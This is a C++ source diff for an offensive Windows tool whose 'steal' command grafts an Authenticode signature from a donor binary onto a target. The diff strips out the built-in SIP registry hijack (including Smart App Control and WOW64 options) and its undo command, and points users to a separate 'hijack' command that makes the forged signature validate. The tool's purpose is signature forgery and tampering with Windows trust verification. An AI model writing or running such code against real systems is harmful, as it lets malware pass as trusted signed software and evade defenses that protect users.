@@ -76,13 +76,7 @@ void print_steal_help(const char* exe) {
         "Steal the Authenticode signature from <donor> and graft it onto <target>.\n\n"
         "Options:\n"
         "  --clone       Also clone metadata (icons, version info, manifest)\n"
-        "  --no-hijack   Do not install SIP hijack (signature will not validate)\n"
-        "  --sip-types   SIP types to hijack (default: PE,PowerShell,MSI)\n"
-        "  --sac         Include Smart App Control SIP (Win11)\n"
-        "  --all-sips    Hijack all 19 SIP GUIDs\n"
-        "  --wow64-only  Write only to WOW6432Node (affects 32-bit callers)\n"
         "  --dry-run     Print what would happen without writing\n"
-        "  --clean       Reverse: restore SIP keys installed by steal\n"
         "  -v            Verbose output\n",
         exe);
 }
@@ -200,39 +194,21 @@ int main(int argc, char* argv[]) {
     g_verbose = verbose;
 
     // ================================================================
-    // steal <donor> <target> [--clone] [--no-hijack] [--sip-types] ...
+    // steal <donor> <target> [--clone]
     // ================================================================
     if (strcmp(cmd, "steal") == 0) {
-        if (argc < 3 || (argc < 4 && !clean_flag)) { print_steal_help(argv[0]); return 1; }
+        if (argc < 4) { print_steal_help(argv[0]); return 1; }
 
-        bool do_clone = false, do_hijack = true;
-        bool wow64_only = false, include_sac = false, all_sips = false;
-        std::string sip_types_str;
+        bool do_clone = false;
         std::string donor, target;
 
-        // Parse positional args (skip flags)
         for (int i = 2; i < argc; i++) {
             if (argv[i][0] == '-') {
                 if (strcmp(argv[i], "--clone") == 0) do_clone = true;
-                else if (strcmp(argv[i], "--no-hijack") == 0) do_hijack = false;
-                else if (strcmp(argv[i], "--wow64-only") == 0) wow64_only = true;
-                else if (strcmp(argv[i], "--sac") == 0) include_sac = true;
-                else if (strcmp(argv[i], "--all-sips") == 0) all_sips = true;
-                else if (strcmp(argv[i], "--sip-types") == 0 && i+1 < argc) sip_types_str = argv[++i];
             } else {
                 if (donor.empty()) donor = argv[i];
                 else if (target.empty()) target = argv[i];
             }
-        }
-
-        // --clean reverses the SIP hijack installed by steal
-        if (clean_flag) {
-            auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
-            if (sips.empty()) { for (int i = 0; i < NUM_STANDARD_SIPS; i++) sips.push_back(ALL_STANDARD_SIPS[i]); }
-            if (dry_run) { std::printf("[dry-run] Would restore %zu SIP keys to defaults\n", sips.size()); return 0; }
-            cleanup_registry(sips);
-            std::printf("[+] SIP persistence removed (%zu entries restored).\n", sips.size());
-            return 0;
         }
 
         if (donor.empty() || target.empty()) { print_steal_help(argv[0]); return 1; }
@@ -240,7 +216,6 @@ int main(int argc, char* argv[]) {
         if (dry_run) {
             std::printf("[dry-run] Would steal signature from %s to %s\n", donor.c_str(), target.c_str());
             if (do_clone) std::printf("[dry-run] Would clone metadata\n");
-            if (do_hijack) std::printf("[dry-run] Would install SIP hijack\n");
             return 0;
         }
 
@@ -254,17 +229,8 @@ int main(int argc, char* argv[]) {
             return 1;
         }
         std::printf("[+] Signature stolen from \"%s\" to \"%s\"\n", donor.c_str(), target.c_str());
-
-        if (do_hijack) {
-            auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
-            if (sips.empty()) return 1;
-            std::printf("[*] Installing SIP persistence for %zu type(s)\n", sips.size());
-            if (!hook_registry(sips, wow64_only)) {
-                err("RegCreateKeyExW", 0, "SIP hijack partially failed.");
-            }
-            std::printf("[+] SIP persistence installed. New processes will accept the stolen signature.\n");
-            std::printf("Undo: %s steal --clean\n", argv[0]);
-        }
+        std::printf("[*] Signature will not validate without SIP hijack or FinalPolicy.\n");
+        std::printf("[*] Run: %s hijack --sip-types PE  to make it validate.\n", argv[0]);
         return 0;
     }
 
